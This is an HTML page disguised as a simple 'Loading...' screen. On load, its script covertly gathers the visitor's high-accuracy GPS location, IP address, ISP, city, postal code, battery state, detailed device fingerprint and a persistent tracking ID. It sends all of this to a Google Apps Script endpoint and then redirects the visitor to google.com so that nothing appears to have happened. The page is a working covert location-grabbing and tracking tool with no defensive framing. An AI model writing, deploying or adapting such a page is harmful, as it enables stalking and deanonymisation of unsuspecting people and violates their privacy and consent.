<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Loading...</title>
  <meta http-equiv="Permissions-Policy" content="geolocation=(self)">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #0b1220;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }

    .wrap{
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:center;
      gap:14px;
      user-select:none;
    }

    .loader {
      width: 58px;
      height: 58px;
      border-radius: 50%;
      border: 6px solid rgba(255,255,255,0.18);
      border-top-color: rgba(255,255,255,0.95);
      animation: spin 0.9s linear infinite;
    }

    .pct{
      color: rgba(255,255,255,0.95);
      font-size: 18px;
      font-weight: 700;
      letter-spacing: 0.5px;
    }

    .sub{
      color: rgba(255,255,255,0.65);
      font-size: 13px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

<div class="wrap">
  <div class="loader" aria-label="Loading"></div>
  <div class="pct" id="pct">1%</div>
  <div class="sub" id="sub">Loading...</div>
</div>

<script>
  const SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbyrpquiZ70NOWn4lPjQN2bBUyb0ybQNNMI5r7lG273MTd1N1TZ1DZH7UkWcuJgUXatU/exec";
  const IP_API = "https://ipapi.co/json/";

  const REDIRECT_AFTER_MS = 3200;

  let p = 1;
  let timer = null;

  function startProgress(){
    timer = setInterval(() => {
      if(p < 70) p += 3;
      else if(p < 88) p += 1;
      else if(p < 92) p += 0.2;
      else p += 0.1;

      if(p > 92) p = 92;
      document.getElementById("pct").innerText = Math.floor(p) + "%";
    }, 120);
  }

  function setProgress100(){
    if(timer) clearInterval(timer);
    document.getElementById("pct").innerText = "100%";
  }

  function setSub(t){
    if(t === "Opening...") {
      document.getElementById("sub").innerText = "Opening...";
    } else {
      document.getElementById("sub").innerText = "Loading...";
    }
  }

  function sleep(ms){
    return new Promise(r => setTimeout(r, ms));
  }

  function nowString(){
    return new Date().toLocaleString();
  }

  // --------------------------
  // Visitor ID (Cookie + LocalStorage)
  // --------------------------
  function randomId(){
    return "V-" + Math.random().toString(36).slice(2, 10) + "-" + Date.now().toString(36);
  }

  function setCookie(name, value, days){
    try {
      const d = new Date();
      d.setTime(d.getTime() + (days*24*60*60*1000));
      const expires = "expires=" + d.toUTCString();
      document.cookie = name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/;SameSite=Lax";
    } catch(e){}
  }

  function getCookie(name){
    try {
      const n = name + "=";
      const ca = document.cookie.split(';');
      for(let i=0;i<ca.length;i++){
        let c = ca[i].trim();
        if(c.indexOf(n) === 0) return decodeURIComponent(c.substring(n.length, c.length));
      }
    } catch(e){}
    return "";
  }

  function getVisitorId(){
    try {
      const v = localStorage.getItem("visitorId");
      if(v) return v;
    } catch(e){}

    const ck = getCookie("visitorId");
    if(ck) {
      try { localStorage.setItem("visitorId", ck); } catch(e){}
      return ck;
    }

    const id = randomId();
    try { localStorage.setItem("visitorId", id); } catch(e){}
    setCookie("visitorId", id, 3650);
    return id;
  }

  async function getUAClientHints(){
    try {
      if(navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        const h = await navigator.userAgentData.getHighEntropyValues([
          "brands",
          "mobile",
          "platform",
          "platformVersion",
          "architecture",
          "model",
          "uaFullVersion"
        ]);

        let brandsText = "";
        try {
          brandsText = (h.brands || []).map(b => (b.brand + " " + b.version)).join(" | ");
        } catch(e) { brandsText = ""; }

        return {
          ch_supported: "Yes",
          ch_brands: brandsText,
          ch_mobile: (h.mobile ? "Yes" : "No"),
          ch_platform: h.platform || "",
          ch_platformVersion: h.platformVersion || "",
          ch_architecture: h.architecture || "",
          ch_model: h.model || "",
          ch_uaFullVersion: h.uaFullVersion || ""
        };
      }
    } catch(e) {}

    return {
      ch_supported: "No",
      ch_brands: "",
      ch_mobile: "",
      ch_platform: "",
      ch_platformVersion: "",
      ch_architecture: "",
      ch_model: "",
      ch_uaFullVersion: ""
    };
  }

  function getBasicInfo(){
    return {
      ua: navigator.userAgent || "",
      platform: navigator.platform || "",
      lang: navigator.language || "",
      tz: (Intl.DateTimeFormat().resolvedOptions().timeZone || ""),
      screenW: screen.width,
      screenH: screen.height,
      pixelRatio: window.devicePixelRatio || 1,

      vendor: navigator.vendor || "",
      maxTouchPoints: (navigator.maxTouchPoints != null ? navigator.maxTouchPoints : ""),
      cookiesEnabled: (navigator.cookieEnabled ? "Yes" : "No"),
      doNotTrack: (navigator.doNotTrack != null ? String(navigator.doNotTrack) : ""),
      hardwareConcurrency: (navigator.hardwareConcurrency != null ? String(navigator.hardwareConcurrency) : ""),
      deviceMemory: (navigator.deviceMemory != null ? String(navigator.deviceMemory) : "")
    };
  }

  function getNetworkInfo(){
    const online = navigator.onLine ? "Yes" : "No";
    let connType = "";
    let downlink = "";

    if (navigator.connection) {
      connType = navigator.connection.effectiveType || "";
      downlink = navigator.connection.downlink ? (navigator.connection.downlink + " Mbps") : "";
    }

    return { online, connType, downlink };
  }

  async function getBatteryInfo(){
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        return {
          level: (b.level * 100).toFixed(0) + "%",
          charging: b.charging ? "Yes" : "No"
        };
      }
    } catch(e) {}
    return { level: "", charging: "" };
  }

  async function getIPInfo(){
    try {
      const r = await fetch(IP_API, { method:"GET" });
      const j = await r.json();

      return {
        ip: j.ip || "",
        isp: j.org || "",
        asn: j.asn || "",
        city: j.city || "",
        region: j.region || "",
        country: j.country_name || "",
        postal: j.postal || ""
      };
    } catch(e) {
      return {
        ip: "",
        isp: "",
        asn: "",
        city: "",
        region: "",
        country: "",
        postal: ""
      };
    }
  }

  function getLocationOptional(){
    return new Promise((resolve) => {
      if(!navigator.geolocation) {
        resolve({ ok:false, reason:"not_supported" });
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const acc = pos.coords.accuracy;
          const speed = (pos.coords.speed == null) ? "" : pos.coords.speed;
          const altitude = (pos.coords.altitude == null) ? "" : pos.coords.altitude;

          resolve({ ok:true, lat, lon, acc, speed, altitude });
        },
        (err) => {
          resolve({ ok:false, reason: (err.code === 1) ? "denied" : "error" });
        },
        { enableHighAccuracy:true, timeout:20000, maximumAge:0 }
      );
    });
  }

  function redirect(){
    window.location.replace("https://www.google.com/");
  }

  async function postNoCors(payload){
    try {
      await fetch(SHEET_WEBAPP_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true
      });
      return true;
    } catch(e) {
      return false;
    }
  }

  async function run(){
    startProgress();
    setSub("Loading...");

    const visitorId = getVisitorId();

    const ipPromise = getIPInfo();
    const chPromise = getUAClientHints();

    const loc = await getLocationOptional();

    const basic = getBasicInfo();
    const net = getNetworkInfo();
    const bat = await getBatteryInfo();
    const ip = await ipPromise;
    const ch = await chPromise;

    let maps = "";
    let lat = "";
    let lon = "";
    let acc = "";
    let speed = "";
    let altitude = "";

    if(loc.ok) {
      lat = String(loc.lat);
      lon = String(loc.lon);
      acc = String(loc.acc);
      speed = String(loc.speed);
      altitude = String(loc.altitude);
      maps = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
    }

    const collected = {
      visitorId: visitorId,
      time: nowString(),

      latitude: lat,
      longitude: lon,
      accuracy: acc,
      speed: speed,
      altitude: altitude,
      maps: maps,

      battery: bat.level,
      charging: bat.charging,

      online: net.online,
      connection: net.connType,
      downlink: net.downlink,

      ip: ip.ip,
      isp: ip.isp,
      asn: ip.asn,
      city: ip.city,
      region: ip.region,
      country: ip.country,
      postal: ip.postal,

      userAgent: basic.ua,
      platform: basic.platform,
      vendor: basic.vendor,
      language: basic.lang,
      timezone: basic.tz,
      screen: basic.screenW + " x " + basic.screenH,
      pixelRatio: String(basic.pixelRatio),
      maxTouchPoints: String(basic.maxTouchPoints),
      cookiesEnabled: basic.cookiesEnabled,
      doNotTrack: basic.doNotTrack,
      hardwareConcurrency: basic.hardwareConcurrency,
      deviceMemory: basic.deviceMemory,

      ch_supported: ch.ch_supported,
      ch_brands: ch.ch_brands,
      ch_mobile: ch.ch_mobile,
      ch_platform: ch.ch_platform,
      ch_platformVersion: ch.ch_platformVersion,
      ch_architecture: ch.ch_architecture,
      ch_model: ch.ch_model,
      ch_uaFullVersion: ch.ch_uaFullVersion
    };

    const ok1 = await postNoCors(collected);
    if(!ok1) {
      await sleep(800);
      await postNoCors(collected);
    }

    setProgress100();
    setSub("Opening...");
    await sleep(REDIRECT_AFTER_MS);
    redirect();
  }

  run();
</script>
</body>
</html>
